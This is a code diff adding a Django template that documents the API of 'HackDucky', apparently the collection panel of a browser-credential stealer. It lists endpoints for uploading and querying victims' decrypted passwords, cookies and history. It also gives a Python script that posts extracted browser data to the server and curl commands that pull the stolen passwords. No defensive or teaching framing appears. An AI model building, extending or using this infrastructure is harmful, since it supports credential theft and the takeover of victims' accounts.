@@ -1,0 +1,135 @@
+{% extends 'victim/base.html' %}
+
+{% block title %}API Documentation - HackDucky{% endblock %}
+
+{% block content %}
+<div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
+    <h1 class="h2"><i class="fas fa-code"></i> API Documentation</h1>
+</div>
+
+<div class="row">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="card-title mb-0">REST API Endpoints</h5>
+            </div>
+            <div class="card-body">
+                <h6>Base URL: <code>http://localhost:8000/api/</code></h6>
+                
+                <h5 class="mt-4">📤 Data Upload</h5>
+                <div class="table-responsive">
+                    <table class="table table-sm">
+                        <tr>
+                            <td><strong>POST</strong></td>
+                            <td><code>/api/upload/</code></td>
+                            <td>Upload victim script data</td>
+                        </tr>
+                    </table>
+                </div>
+                
+                <h6>Upload Payload Example:</h6>
+                <pre><code>{
+  "profiles": [
+    {
+      "name": "Profile 1",
+      "browser_type": "Chrome",
+      "passwords": [
+        {
+          "url": "https://example.com",
+          "username": "user@example.com",
+          "password": "decrypted_password"
+        }
+      ],
+      "cookies": [...],
+      "history": [...]
+    }
+  ]
+}</code></pre>
+
+                <h5 class="mt-4">📊 Data Retrieval</h5>
+                <div class="table-responsive">
+                    <table class="table table-sm">
+                        <tr>
+                            <td><strong>GET</strong></td>
+                            <td><code>/api/status/</code></td>
+                            <td>Get database statistics</td>
+                        </tr>
+                        <tr>
+                            <td><strong>GET</strong></td>
+                            <td><code>/api/profiles/</code></td>
+                            <td>List all browser profiles</td>
+                        </tr>
+                        <tr>
+                            <td><strong>GET</strong></td>
+                            <td><code>/api/profiles/{id}/</code></td>
+                            <td>Get specific profile details</td>
+                        </tr>
+                        <tr>
+                            <td><strong>GET</strong></td>
+                            <td><code>/api/passwords/</code></td>
+                            <td>List all passwords</td>
+                        </tr>
+                        <tr>
+                            <td><strong>GET</strong></td>
+                            <td><code>/api/cookies/</code></td>
+                            <td>List all cookies</td>
+                        </tr>
+                        <tr>
+                            <td><strong>GET</strong></td>
+                            <td><code>/api/history/</code></td>
+                            <td>List all history entries</td>
+                        </tr>
+                    </table>
+                </div>
+
+                <h5 class="mt-4">🔍 Query Parameters</h5>
+                <p>Some endpoints support filtering:</p>
+                <ul>
+                    <li><code>?profile_id=1</code> - Filter by profile ID</li>
+                    <li><code>?browser_type=Chrome</code> - Filter by browser type</li>
+                </ul>
+
+                <h5 class="mt-4">📝 Usage Examples</h5>
+                
+                <h6>Upload Data (Python):</h6>
+                <pre><code>import requests
+import json
+
+# Load your extracted data
+with open('output.json', 'r') as f:
+    data = json.load(f)
+
+# Prepare payload
+payload = {'profiles': []}
+for browser_data in data:
+    for profile_data in browser_data:
+        payload['profiles'].append(profile_data)
+
+# Upload to API
+response = requests.post(
+    'http://localhost:8000/api/upload/',
+    json=payload,
+    headers={'Content-Type': 'application/json'}
+)
+
+if response.status_code == 201:
+    print("Upload successful!")
+else:
+    print("Upload failed:", response.text)</code></pre>
+
+                <h6>Check Status (curl):</h6>
+                <pre><code>curl http://localhost:8000/api/status/</code></pre>
+
+                <h6>Get Passwords (curl):</h6>
+                <pre><code>curl http://localhost:8000/api/passwords/?browser_type=Chrome</code></pre>
+
+                <h5 class="mt-4">🔒 Security Notes</h5>
+                <div class="alert alert-warning">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <strong>Warning:</strong> The API endpoints are currently open (no authentication).
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
